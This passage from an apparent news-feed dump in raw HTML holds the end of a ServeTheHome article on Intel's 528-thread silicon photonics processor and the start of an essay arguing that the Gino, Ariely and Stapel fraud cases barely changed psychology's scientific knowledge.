https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-696x391.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_11-747x420.jpg 747w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72380">Intel Direct Mesh To Mesh Optical Fabric_Page_11</figcaption></figure>
<p>In terms of power, this was done in an 8-core 75W CPU. More than half of the power here is being used by silicon photonics.</p>
<figure id="attachment_72381" aria-describedby="caption-attachment-72381"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_12/" rel="attachment wp-att-72381"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_12" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_12-747x420.jpg 747w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72381">Intel Direct Mesh To Mesh Optical Fabric_Page_12</figcaption></figure>
<p>Here is the simulated to measured workload performance scaling.</p>
<figure id="attachment_72382" aria-describedby="caption-attachment-72382"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_13/" rel="attachment wp-att-72382"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_13" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13-747x420.jpg 747w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_13.jpg 2000w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72382">Intel Direct Mesh To Mesh Optical Fabric_Page_13</figcaption></figure>
<p>Here is the actual die photograph and confirmation that this is being done on TSMC 7nm.</p>
<figure id="attachment_72383" aria-describedby="caption-attachment-72383"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_14/" rel="attachment wp-att-72383"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_14" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-696x392.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14-747x420.jpg 747w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_14.jpg 2000w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72383">Intel Direct Mesh To Mesh Optical Fabric_Page_14</figcaption></figure>
<p>Here is what the package and test board looks like:</p>
<figure id="attachment_72384" aria-describedby="caption-attachment-72384"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_15/" rel="attachment wp-att-72384"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_15" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-696x391.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15-747x420.jpg 747w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_15.jpg 1947w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72384">Intel Direct Mesh To Mesh Optical Fabric_Page_15</figcaption></figure>
<p>This was done in 7nm and work is still happening on this in the lab.</p>
<figure id="attachment_72385" aria-describedby="caption-attachment-72385"><a href="https://www.servethehome.com/intel-shows-8-core-528-thread-processor-with-silicon-photonics/intel-direct-mesh-to-mesh-optical-fabric_page_16/" rel="attachment wp-att-72385"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-800x450.jpg" alt="Intel Direct Mesh To Mesh Optical Fabric_Page_16" width="696" height="392" srcset="https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-800x450.jpg 800w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-400x225.jpg 400w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-1536x864.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-2048x1152.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-696x391.jpg 696w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-1068x601.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2023/08/Intel-Direct-Mesh-to-Mesh-Optical-Fabric_Page_16-747x420.jpg 747w" sizes="(max-width: 696px) 100vw, 696px"></a><figcaption id="caption-attachment-72385">Intel Direct Mesh To Mesh Optical Fabric_Page_16</figcaption></figure>
<h2>Final Words</h2>
<p>It was interesting to see that Intel did not use the pluggable connector it showed off at Innovation 2022. It seems like this might have been built before that project was ready. This was assisted by Ayar Labs on the optical side.</p>
<p>Perhaps the big item is the 66 threads per core! That is a huge figure. I think folks will enjoy that stat.</p>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I’m so sorry for psychology’s loss, whatever it is (145 pts)]]></title>
            <link>https://www.experimental-history.com/p/im-so-sorry-for-psychologys-loss</link>
            <guid>37315292</guid>
            <pubDate>Tue, 29 Aug 2023 22:59:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.experimental-history.com/p/im-so-sorry-for-psychologys-loss">https://www.experimental-history.com/p/im-so-sorry-for-psychologys-loss</a>, See on <a href="https://news.ycombinator.com/item?id=37315292">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg" width="1456" height="913" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/bbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:913,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:221469,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbccdabb-09b6-440f-8d09-7a7abfb82757_1783x1118.jpeg 1456w" sizes="100vw" fetchpriority="high"></picture></div></a><figcaption>Photo cred: my dad</figcaption></figure></div><p>Here are some recent extraordinary events:</p><p><span>The bloggers at </span><a href="http://datacolada.org/" rel="">Data Colada</a><span> published a four-part series (</span><a href="http://datacolada.org/109" rel="">1</a><span>, </span><a href="http://datacolada.org/110" rel="">2</a><span>, </span><a href="http://datacolada.org/111" rel="">3</a><span>, </span><a href="http://datacolada.org/112" rel="">4</a><span>) alleging fraud in papers co-authored by Harvard Business School professor Francesca Gino. She responded by </span><a href="https://www.vox.com/future-perfect/2023/8/9/23825966/francesca-gino-honesty-research-scientific-fraud-defamation-harvard-university" rel="">suing</a><span> both them and Harvard for $25 million.&nbsp;</span></p><p><span>Earlier, the Colada boys had </span><a href="https://datacolada.org/98" rel="">found</a><span> evidence of fraud in a paper co-authored by Duke professor Dan Ariely. The real juicy bit? There’s a paper written by both Ariely and Gino in which they might have </span><em>independently </em><span>faked the data for two separate studies in the same article. Oh, and the paper is about dishonesty.</span></p><p>Also, there's this gem:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png" width="437" height="383" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:383,&quot;width&quot;:437,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa9ed7ec8-549d-421a-82ba-36d72335a1fa_437x383.png 1456w" sizes="100vw"></picture></div></a></figure></div><p>(Both Ariely and Gino deny any wrongdoing. Since we're now in the business of suing blogs, let me state that I, of course, have no idea if Ariely, Gino, or anybody else ever engaged in research misconduct. There's no evidence that I have any ideas at all! I'm just a bunch of bees!)</p><p>Gino's coauthors are scrambling to either find out if their data is solid, or to assure others that it is. She has students who are trying to get jobs right now; God help them. Ariely still has his job, but he runs a big lab, is involved in multiple companies, and collaborates with a lot of people, so if he eventually does go down, he'll take a lot of people with him.</p><p>All of that is bad. But there's an extra uncomfortable fact that nobody seems to mention, perhaps because they don't see it, or perhaps because they don't want it to be true.</p><p><span>This whole debacle matters a lot </span><em>socially</em><span>: careers ruined, reputations in tatters, lawsuits flying. But strangely, it</span><em> </em><span>doesn't seem to matter much </span><em>scientifically</em><span>. That is, our understanding of psychology remains unchanged. If you think of psychology as a forest, we haven't felled a tree or even broken a branch. We've lost a few apples.&nbsp;</span></p><p>That might sound like a dunk on Gino and Ariely, or like a claim about how experimental psychology is wonderfully robust. It is, unfortunately, neither. It is actually a terrifying fact that you can reveal whole swaths of a scientific field to be fraudulent and it doesn't make a difference. It's also a chance to see exactly what's gone wrong in psychology, and maybe how we can put it right.</p><p><span>Gino's work has been cited over </span><a href="https://scholar.google.com/citations?user=lFzOk00AAAAJ&amp;hl=en" rel="">33,000 times</a><span>, and Ariely's work has been cited over </span><a href="https://scholar.google.com/citations?user=Z1G9Lk4AAAAJ&amp;hl=en" rel="">66,000 times</a><span>. They both got tenured professorships at elite universities. They wrote books, some of which became bestsellers. They gave big TED talks and lots of people watched them. By every conventional metric of success, these folks were killing it.</span></p><p><span>Now let's imagine every allegation of fraud is true, and everything Ariely and Gino ever did gets removed from the scientific record, </span><em>It's a Wonderful Life</em><span>-style. (We are, I can't stress this enough, </span><em>imagining </em><span>this. Buzz buzz, I’m bees.) What would change?</span></p><p><span>Not much. Let's start with Ariely. He's famous for his work on irrationality, which you could charitably summarize as “humans deviate from the rules of rationality in predictable ways,” or you could uncharitably summarize as “humans r pretty dumb lol.” He's a great popularizer of this research because he has a knack for doing meme-able studies, like one where, uh, </span><a href="https://people.duke.edu/~dandan/webfiles/PapersPI/Sexual%20Arousal%20and%20Decision%20making.pdf" rel="">men reported their sexual preferences while jerking off</a><span>. But psychologists have been producing studies where humans deviate from the rules of rationality for </span><a href="https://apps.dtic.mil/sti/pdfs/AD0767426.pdf" rel="">50 years</a><span>. We've piled up </span><a href="https://en.wikipedia.org/wiki/List_of_cognitive_biases" rel="">hundreds</a><span> of heuristics, biases, illusions, effects, and paradoxes, and if you scooped out Ariely's portion of the pile, it would still be a giant pile. A world without him is scientifically a very similar world to the one we have now.</span></p><p>Same goes for Gino. Much of her work is also part of the big pile of cognitive biases, and, just like Ariely, that pile would be huge with or without her. For the rest, you can judge for yourself the four studies that were recently retracted:</p><ol><li><p><span>Participants </span><a href="http://datacolada.org/110" rel="">said</a><span> they wanted cleaning products more after they were forced to argue </span><em>against</em><span> something they believed (vs. arguing </span><em>for </em><span>the thing they believed).</span></p></li><li><p><span>Participants either wrote about 1) a duty or obligation, 2) a hope or aspiration, or 3) their usual evening activities. Then they imagined networking at a corporate event. The people who wrote about the duty or obligation </span><a href="http://datacolada.org/112" rel="">said</a><span> they felt more  “dirty, tainted, inauthentic, ashamed, wrong, unnatural, impure” while imagining the networking event than people who wrote about their hopes/aspirations or their evening activities.</span></p></li><li><p><span>Participants who were given the opportunity to lie about the outcome of a coin toss (they could get more money if they lied), and who did indeed lie, later </span><a href="http://datacolada.org/111" rel="">came up</a><span> with more uses for a newspaper in 1 minute.</span></p></li><li><p><span>Participants completed as many math problems as they could in 1 minute, and they could lie about how many they got right (they could get more money if they lied). Then they filled out a form where they reported how much time and money they spent coming to the lab, for which they were compensated up to a certain amount (here they could also get more money if they lied). Some participants signed at the top of the form, and some signed at the bottom. The participants who signed at the bottom </span><a href="http://datacolada.org/109" rel="">lied</a><span> more than the participants who signed at the top.</span></p></li></ol><p><span>(I'm describing these studies in </span><a href="https://www.experimental-history.com/p/psychology-is-experimental-history-4eb" rel="">experimental history</a><span> terms—as in, people doing things. The authors described these results as “inauthenticity causes feelings of impurity” and “dishonesty leads to creativity” and “signing makes ethics salient.” See what a difference it makes to talk about people and the things they did!)</span></p><p><span>Looking over </span><a href="https://francescagino.com/researchpapers" rel="">the rest of Gino's papers</a><span>, these studies seem like pretty standard examples of her research. I'll only speak for myself here: if I found out that every single one of these studies had been nothing more than Gino running create_fake_data.exe on her computer over and over again, I wouldn't believe anything different about the human mind than I already believe now.</span></p><p><span>This isn't specific to Gino and Ariely; I think you could </span><em>It’s-a-Wonderful-Life </em><span>most psychologists, even the famous ones, without any major changes to what we know. This was also true the last time we discovered a prolific fraudster. Diederik Stapel, a Dutch social psychologist, faked at least </span><a href="https://retractionwatch.com/the-retraction-watch-leaderboard/" rel="">58 papers</a><span>. I mean </span><em>really </em><span>faked: the guy eventually </span><a href="https://www.nytimes.com/2013/04/28/magazine/diederik-stapels-audacious-academic-fraud.html" rel="">admitted</a><span> he would open up a blank spreadsheet and start typing numbers. Unlike Gino and Ariely, there's no ambiguity here—Stapel’s entire scientific career got wiped out.</span></p><p>So what was the scientific fallout of Stapel's demise? What theories had to be rewritten? What revisions did we have to make to our understanding of the human mind?</p><p><span>Basically none, as far as I can tell. The universities where Stapel worked released a long </span><a href="https://pure.mpg.de/rest/items/item_1569964_7/component/file_1569966/content" rel="">report</a><span> cataloging all of his misdeeds, and the part called “Impact of the fraud” (section 3.7 if you're following along at home) details all sorts of </span><em>reputational </em><span>harm: students, schools, co-authors, journals, and even psychology itself all suffer from their association with Stapel. It says nothing about the </span><em>scientific</em><span> impact—the theories that have to be rolled back, the models that have to be retired, the subfields that are at square one again. And looking over Stapel's retracted work, it's because there are no theories, models, or subfields that changed much at all. The </span><a href="https://scholar.google.ca/citations?user=a51g4WoAAAAJ&amp;hl=en" rel="">10,000+</a><span> citations of his work now point nowhere, and it makes no difference.</span></p><p><span>As a young psychologist, this chills me to my bones. Apparently is possible to reach the stratosphere of scientific achievement, to publish over and over again in “high impact” journals, to rack up tens of thousands of citations, and for </span><em>none of it to matter</em><span>. Every marker of success, the things that are supposed to tell you that you're on the right track, that you're making a real contribution to science—they might mean nothing at all. So, uh, what exactly am I doing?</span></p><p><span>But hey, these are just three people, albeit three pretty famous people. Maybe the impact of any single scientist is simply too small to be seen from a distance. If you deleted a whole bunch of papers from across the literature, though, </span><em>that </em><span>would really make a difference, and we’d have to rebuild big parts of the field from the ground up. Right?</span></p><p><span>No, not really. We did delete those papers, and nothing much happened. In 2015, a big team of researchers tried to redo 100 psychology studies, and about </span><a href="https://eprints.keele.ac.uk/id/eprint/877/1/Open%20Science%20%28Science%20Pre-Print%29.pdf" rel="">60%</a><span> failed to replicate.</span></p><p><span> This finding made big waves and headlines, and it's already been cited nearly 8,000 times.</span></p><p><span>But the next time someone brings it up, ask them to name as many of the 100 studies as they can. My bet is they top out at zero. I'm basically at zero myself, and I've written about that study </span><a href="https://www.experimental-history.com/p/psychology-might-be-a-big-stinkin" rel="">at length</a><span>. (I asked a few of my colleagues in case I'm just uniquely stupid, and their answers were: 0, 0, 0, 0, 1, and 3.)</span></p><p><span>This is really weird. Imagine if someone told you that 60% of your loved ones had died in a plane crash. Your first reaction might be disbelief and horror—“Why were 60% of my loved ones on the same plane? Were they all hanging out without me?”—but then you would want to know </span><em>who</em><span> died. Because that really matters! The people you love are not interchangeable! Was it your mom, your best friend, or what? It would be insane to only remember the 60% statistic and then, whenever someone asked you who died in that horrible plane crash, respond, “Hmm, you know, I never really looked into it. Maybe, um, Uncle Fred? Or my friend Clarissa? It was definitely 60% of my loved ones, though, whoever it was.”</span></p><p>So if you hear that 60% of papers in your field don’t replicate, shouldn't you care a lot about which ones? Why didn't my colleagues and I immediately open up that paper's supplement, click on the 100 links, and check whether any of our most beloved findings died? The answer has to be, “We just didn't think it was an important thing to do.” We heard about the plane crash and we didn't even bother to check the list of casualties. What a damning indictment of our field!</p><p><span>(For more on this, see </span><a href="https://www.experimental-history.com/p/psychology-might-be-a-big-stinkin" rel="">Psychology might be a big stinkin' load of hogwash and that's just fine</a><span>).</span></p><p><span>All of this is pretty distressing, but it feels a little better when you remember that </span><a href="https://www.experimental-history.com/p/science-is-a-strong-link-problem" rel="">science is a strong-link problem</a><span>. That's why you can disappear entire careers and shoot holes through the literature without losing anything. Fields are mostly flab, so you're unlikely to hit any vital organs.</span></p><p>Okay, so where are psychology's strong links? Well, earlier this year, the psychologist Paul Bloom asked exactly this question on Twitter:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png" width="603" height="238" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/ee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:238,&quot;width&quot;:603,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee2f9f96-39a0-40fa-a32a-47eca71437f0_603x238.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>A bunch of psychologists weighed in, and their </span><a href="https://twitter.com/paulbloomatyale/status/1619737276585758722?s=43&amp;t=dI45tzZfqhqaAR30Pr-_uA" rel="">responses</a><span> bring me a deep sense of despair:</span></p><p>“psychopathology symptoms have small world network properties”</p><p>“people's 